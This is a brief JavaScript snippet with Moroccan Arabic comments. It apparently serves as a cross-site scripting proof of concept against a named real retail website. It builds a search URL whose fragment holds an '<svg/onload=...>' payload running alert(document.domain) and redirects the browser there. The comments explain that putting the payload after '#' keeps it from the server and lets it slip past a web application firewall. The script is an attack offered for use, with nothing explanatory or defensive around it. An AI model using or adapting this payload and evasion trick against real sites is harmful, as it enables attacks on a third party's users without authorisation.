<script>
    // غادي نحطو السم (Payload) مورا الـ # باش السيرفر ما يشوفوش وما يبلكيهش
    // والـ XSS ديالنا غادي يقرا راسو براسو من الـ URL
    
    let xssPayload = "alert(document.domain)";
    
    // هاد الرابط كيهرب من الـ WAF حيت الكود كاين مورا الـ #
    let target = "https://www.decathlon.com/search?q=test#<svg/onload=" + xssPayload + ">";
    
    window.location.href = target;
</script>
